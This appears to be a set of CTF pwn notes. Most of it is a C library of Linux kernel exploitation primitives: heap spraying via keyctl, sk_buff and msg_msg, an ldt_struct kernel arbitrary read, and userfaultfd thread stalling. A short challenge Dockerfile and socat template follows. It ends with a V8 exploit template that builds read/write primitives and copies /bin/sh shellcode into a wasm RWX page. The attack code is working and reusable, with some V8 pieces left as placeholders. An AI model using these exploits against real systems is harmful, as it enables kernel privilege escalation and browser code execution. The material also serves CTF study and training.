/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);

    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - keyctl related
*/

/**
 * The MUSL also doesn't contain `keyctl.h` :( 
 * Luckily we just need a bit of micros in exploitation, 
 * so just define them directly is okay :)
 */

#define KEY_SPEC_PROCESS_KEYRING    -2    /* - key ID for process-specific keyring */
#define KEYCTL_UPDATE            2    /* update a key */
#define KEYCTL_REVOKE            3    /* revoke a key */
#define KEYCTL_UNLINK            9    /* unlink a key from a keyring */
#define KEYCTL_READ            11    /* read a key or keyring's contents */

int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/**
 * V - sk_buff spraying related
 * note that the sk_buff's tail is with a 320-bytes skb_shared_info
 */
#define SOCKET_NUM 8
#define SK_BUFF_NUM 128

/**
 * socket's definition should be like:
 * int sk_sockets[SOCKET_NUM][2];
 */

int init_socket_array(int sk_socket[SOCKET_NUM][2])
{
    /* socket pairs to spray sk_buff */
    for (int i = 0; i < SOCKET_NUM; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
            printf("[x] failed to create no.%d socket pair!\n", i);
            return -1;
        }
    }

    return 0;
}

int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (write(sk_socket[i][0], buf, size) < 0) {
                printf("[x] failed to spray %d sk_buff for %d socket!", j, i);
                return -1;
            }
        }
    }

    return 0;
}

int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (read(sk_socket[i][1], buf, size) < 0) {
                puts("[x] failed to received sk_buff!");
                return -1;
            }
        }
    }

    return 0;
}

/**
 * VI - msg_msg related
*/

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

struct msg_msg {
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg {
    uint64_t    next;
};

/*
struct msgbuf {
    long mtype;
    char mtext[0];
};
*/

int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
              uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

/**
 * VII - ldt_struct related
*/

/**
 * Somethings we may want to compile the exp binary with MUSL-GCC, which
 * doesn't contain the `asm/ldt.h` file.
 * As the file is small, I copy that directly to here :)
 */

/* Maximum number of LDT entries supported. */
#define LDT_ENTRIES    8192
/* The size of each LDT entry. */
#define LDT_ENTRY_SIZE    8

#ifndef __ASSEMBLY__
/*
 * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS
 * not to the default values if you still want to do syscalls. This
 * call is more for 32bit mode therefore.
 */
struct user_desc {
    unsigned int  entry_number;
    unsigned int  base_addr;
    unsigned int  limit;
    unsigned int  seg_32bit:1;
    unsigned int  contents:2;
    unsigned int  read_exec_only:1;
    unsigned int  limit_in_pages:1;
    unsigned int  seg_not_present:1;
    unsigned int  useable:1;
#ifdef __x86_64__
    /*
     * Because this bit is not present in 32-bit user code, user
     * programs can pass uninitialized values here.  Therefore, in
     * any context in which a user_desc comes from a 32-bit program,
     * the kernel must act as though lm == 0, regardless of the
     * actual value.
     */
    unsigned int  lm:1;
#endif
};

#define MODIFY_LDT_CONTENTS_DATA    0
#define MODIFY_LDT_CONTENTS_STACK    1
#define MODIFY_LDT_CONTENTS_CODE    2

#endif /* !__ASSEMBLY__ */

/* this should be referred to your kernel */
#define SECONDARY_STARTUP_64 0xffffffff81000060

/* desc initializer */
static inline void init_desc(struct user_desc *desc)
{
    /* init descriptor info */
    desc->base_addr = 0xff0000;
    desc->entry_number = 0x8000 / 8;
    desc->limit = 0;
    desc->seg_32bit = 0;
    desc->contents = 0;
    desc->limit_in_pages = 0;
    desc->lm = 0;
    desc->read_exec_only = 0;
    desc->seg_not_present = 0;
    desc->useable = 0;
}

/**
 * @brief burte-force hitting page_offset_base by modifying ldt_struct
 * 
 * @param ldt_cracker function to make the ldt_struct modifiable
 * @param cracker_args args of ldt_cracker
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param burte_size size of each burte-force hitting
 * @return size_t address of page_offset_base
 */
size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void*),
                                        void *cracker_args,
                                        void *(*ldt_momdifier)(void*, size_t), 
                                        void *momdifier_args,
                                        uint64_t burte_size)
{
    struct user_desc desc;
    uint64_t page_offset_base = 0xffff888000000000;
    uint64_t temp;
    char *buf;
    int retval;

    /* init descriptor info */
    init_desc(&desc);

    /* make the ldt_struct modifiable */
    ldt_cracker(cracker_args);
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    /* leak kernel direct mapping area by modify_ldt() */
    while(1) {
        ldt_momdifier(momdifier_args, page_offset_base);
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval > 0) {
            break;
        }
        else if (retval == 0) {
            printf("[x] no mm->context.ldt!");
            page_offset_base = -1;
            break;
        }
        page_offset_base += burte_size;
    }

    return page_offset_base;
}

/**
 * @brief read the contents from a specific kernel memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 * 
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param addr address of kernel memory to read
 * @param res_buf buf to be written the data from kernel memory
 */
void ldt_arbitrary_read(void *(*ldt_momdifier)(void*, size_t), 
                        void *momdifier_args, size_t addr, char *res_buf)
{
    static char buf[0x8000];
    struct user_desc desc;
    uint64_t temp;
    int pipe_fd[2];

    /* init descriptor info */
    init_desc(&desc);

    /* modify the ldt_struct->entries to addr */
    ldt_momdifier(momdifier_args, addr);

    /* read data by the child process */
    pipe(pipe_fd);
    if (!fork()) {
        /* child */
        syscall(SYS_modify_ldt, 0, buf, 0x8000);
        write(pipe_fd[1], buf, 0x8000);
        exit(0);
    } else {
        /* parent */
        wait(NULL);
        read(pipe_fd[0], res_buf, 0x8000);
    }

    close(pipe_fd[0]);
    close(pipe_fd[1]);
}

/**
 * @brief seek specific content in the memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 * 
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param page_offset_base the page_offset_base we leakked before
 * @param mem_finder your own function to search on a 0x8000-bytes buf.
 *          It should be like `size_t func(void *args, char *buf)` and the `buf`
 *          is where we store the data from kernel in ldt_seeking_memory().
 *          The return val should be the offset of the `buf`, `-1` for failure
 * @param finder_args your own function's args
 * @return size_t kernel addr of content to find, -1 for failure
 */
size_t ldt_seeking_memory(void *(*ldt_momdifier)(void*, size_t), 
                        void *momdifier_args, uint64_t page_offset_base,
                        size_t (*mem_finder)(void*, char *), void *finder_args)
{
    static char buf[0x8000];
    size_t search_addr, result_addr = -1, offset;

    search_addr = page_offset_base;

    while (1) {
        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);

        offset = mem_finder(finder_args, buf);
        if (offset != -1) {
            result_addr = search_addr + offset;
            break;
        }

        search_addr += 0x8000;
    }

    return result_addr;
}

/**
 * VIII - userfaultfd related code
 */

/**
 * The MUSL also doesn't contain `userfaultfd.h` :( 
 * Luckily we just need a bit of micros in exploitation, 
 * so just define them directly is okay :)
 */

#define UFFD_API ((uint64_t)0xAA)
#define _UFFDIO_REGISTER        (0x00)
#define _UFFDIO_COPY            (0x03)
#define _UFFDIO_API            (0x3F)

/* userfaultfd ioctl ids */
#define UFFDIO 0xAA
#define UFFDIO_API        _IOWR(UFFDIO, _UFFDIO_API,    \
                      struct uffdio_api)
#define UFFDIO_REGISTER        _IOWR(UFFDIO, _UFFDIO_REGISTER, \
                      struct uffdio_register)
#define UFFDIO_COPY        _IOWR(UFFDIO, _UFFDIO_COPY,    \
                      struct uffdio_copy)

/* read() structure */
struct uffd_msg {
    uint8_t    event;

    uint8_t    reserved1;
    uint16_t    reserved2;
    uint32_t    reserved3;

    union {
        struct {
            uint64_t    flags;
            uint64_t    address;
            union {
                uint32_t ptid;
            } feat;
        } pagefault;

        struct {
            uint32_t    ufd;
        } fork;

        struct {
            uint64_t    from;
            uint64_t    to;
            uint64_t    len;
        } remap;

        struct {
            uint64_t    start;
            uint64_t    end;
        } remove;

        struct {
            /* unused reserved fields */
            uint64_t    reserved1;
            uint64_t    reserved2;
            uint64_t    reserved3;
        } reserved;
    } arg;
} __attribute__((packed));

#define UFFD_EVENT_PAGEFAULT    0x12

struct uffdio_api {
    uint64_t api;
    uint64_t features;
    uint64_t ioctls;
};

struct uffdio_range {
    uint64_t start;
    uint64_t len;
};

struct uffdio_register {
    struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING    ((uint64_t)1<<0)
#define UFFDIO_REGISTER_MODE_WP        ((uint64_t)1<<1)
    uint64_t mode;
    uint64_t ioctls;
};


struct uffdio_copy {
    uint64_t dst;
    uint64_t src;
    uint64_t len;
#define UFFDIO_COPY_MODE_DONTWAKE        ((uint64_t)1<<0)
    uint64_t mode;
    int64_t copy;
};

//#include <linux/userfaultfd.h>

char temp_page_for_stuck[0x1000];

void register_userfaultfd(pthread_t *monitor_thread, void *addr,
                          unsigned long len, void *(*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1) {
        err_exit("userfaultfd");
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        err_exit("ioctl-UFFDIO_API");
    }

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
        err_exit("ioctl-UFFDIO_REGISTER");
    }

    s = pthread_create(monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0) {
        err_exit("pthread_create");
    }
}

void *uffd_handler_for_stucking_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1) {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        /* just stuck there is okay... */
        sleep(100000000);

        if (nread == 0) {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1) {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            err_exit("Unexpected event on userfaultfd\n");
        }

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
            err_exit("ioctl-UFFDIO_COPY");
        }

        return NULL;
    }
}

void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread, 
                                          void *buf, unsigned long len)
{
    register_userfaultfd(monitor_thread, buf, len, 
                         uffd_handler_for_stucking_thread);
}


/**
 * IX - kernel structures 
 */

struct file;
struct file_operations;
struct tty_struct;
struct tty_driver;
struct serial_icounter_struct;
struct ktermios;
struct termiox;
struct seq_operations;

struct seq_file {
    char *buf;
    size_t size;
    size_t from;
    size_t count;
    size_t pad_until;
    loff_t index;
    loff_t read_pos;
    uint64_t lock[4]; //struct mutex lock;
    const struct seq_operations *op;
    int poll_event;
    const struct file *file;
    void *private;
};

struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};

struct pipe_buf_operations {
    /*
     * ->confirm() verifies that the data in the pipe buffer is there
     * and that the contents are good. If the pages in the pipe belong
     * to a file system, we may need to wait for IO completion in this
     * hook. Returns 0 for good, or a negative error value in case of
     * error.  If not present all pages are considered good.
     */
    int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

    /*
     * When the contents of this pipe buffer has been completely
     * consumed by a reader, ->release() is called.
     */
    void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

    /*
     * Attempt to take ownership of the pipe buffer and its contents.
     * ->try_steal() returns %true for success, in which case the contents
     * of the pipe (the buf->page) is locked and now completely owned by the
     * caller. The page may then be transferred to a different mapping, the
     * most often used case is insertion into different file address space
     * cache.
     */
    int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

    /*
     * Get a reference to the pipe buffer.
     */
    int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};

#endif
```



# Spirit出题模板

```bash
docker save -o /tmp/1.tar ubuntu:24.04

patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./pwn
patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn




```

```dockerfile
FROM debian:bookworm-slim

# Minimal runtime deps
RUN apt-get update \
    && apt-get install -y --no-install-recommends socat \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m ctf
WORKDIR /home/ctf/onlyfgets

COPY onlyfgets ld-linux-x86-64.so.2 libc.so.6 flag.txt run entrypoint.sh ./

RUN chown -R ctf:ctf /home/ctf/onlyfgets /home/ctf/onlyfgets/flag.txt

USER ctf
EXPOSE 8889

CMD ["/bin/bash", "/home/ctf/onlyfgets/entrypoint.sh"]

```

```shell
#!/bin/sh

echo "$FLAG" > /home/ctf/onlyfgets/flag.txt
chmod 440 /home/ctf/onlyfgets/flag.txt

socat TCP-LISTEN:8889,reuseaddr,fork EXEC:/home/ctf/onlyfgets/run,stderr

```

# V8

```javascript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
  f64[0] = v;
  return u32;
}
function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}
function ftoi(f)
{
  f64[0] = f;
    return bigUint64[0];
}
function itof(i)
{
    bigUint64[0] = i;
    return f64[0];
}
function hex(i)
{
    return i.toString(16).padStart(8, "0");
}

function fakeObj(addr_to_fake)
{
    ?
}

function addressOf(obj_to_leak)
{
    ?
}

function read64(addr)
{
    fake_array[1] = itof(addr - 0x8n + 0x1n);
    return fake_object[0];
}

function write64(addr, data)
{
    fake_array[1] = itof(addr - 0x8n + 0x1n);
    fake_object[0] = itof(data);
}

function copy_shellcode_to_rwx(shellcode, rwx_addr)
{
  var data_buf = new ArrayBuffer(shellcode.length * 8);
  var data_view = new DataView(data_buf);
  var buf_backing_store_addr_lo = addressOf(data_buf) + 0x18n;
  var buf_backing_store_addr_up = buf_backing_store_addr_lo + 0x8n;
  var lov = d2u(read64(buf_backing_store_addr_lo))[0];
  var rwx_page_addr_lo = u2d(lov, d2u(rwx_addr)[0]);
  var hiv = d2u(read64(buf_backing_store_addr_up))[1];
  var rwx_page_addr_hi = u2d(d2u(rwx_addr, hiv)[1]);
  var buf_backing_store_addr = ftoi(u2d(lov, hiv));
  console.log("[*] buf_backing_store_addr: 0x"+hex(buf_backing_store_addr));

  write64(buf_backing_store_addr_lo, ftoi(rwx_page_addr_lo));
  write64(buf_backing_store_addr_up, ftoi(rwx_page_addr_hi));
  for (let i = 0; i < shellcode.length; ++i)
    data_view.setFloat64(i * 8, itof(shellcode[i]), true);
}

var double_array = [1.1];
var obj = {"a" : 1};
var obj_array = [obj];
var array_map = ?;
var obj_map = ?;

var fake_array = [
  array_map,
  itof(0x4141414141414141n)
];

fake_array_addr = addressOf(fake_array);
console.log("[*] leak fake_array addr: 0x" + hex(fake_array_addr));
fake_object_addr = fake_array_addr - 0x10n;
var fake_object = fakeObj(fake_object_addr);
var wasm_instance_addr = addressOf(wasmInstance);
console.log("[*] leak wasm_instance addr: 0x" + hex(wasm_instance_addr));
var rwx_page_addr = read64(wasm_instance_addr + 0x68n);
console.log("[*] leak rwx_page_addr: 0x" + hex(ftoi(rwx_page_addr)));

var shellcode = [
  0x2fbb485299583b6an,
  0x5368732f6e69622fn,
  0x050f5e5457525f54n
];

copy_shellcode_to_rwx(shellcode, rwx_page_addr);
f();
```


